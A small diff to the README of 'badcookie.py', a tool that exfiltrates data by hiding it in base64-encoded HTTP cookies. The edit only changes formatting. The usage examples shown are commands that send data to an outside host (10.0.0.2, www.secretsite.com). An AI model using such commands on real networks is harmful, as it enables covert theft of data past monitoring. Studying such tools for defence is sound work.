@@ -22,9 +22,10 @@ Bad cookie exfiltrates data via base64 encoded HTTP cookies.
 `badcookie.py <destination_host> <exfiltrated_data>`
 
 `Example(1): badcookie.py 10.0.0.2 "very important data"`
+
 `Example(2): badcookie.py www.secretsite.com "very important data"`
 
-`Use quotes if you plan to transmit data with whitespace`
+Use quotes if you plan to transmit data with whitespace
 
 
 #Setting up the data exfiltration process
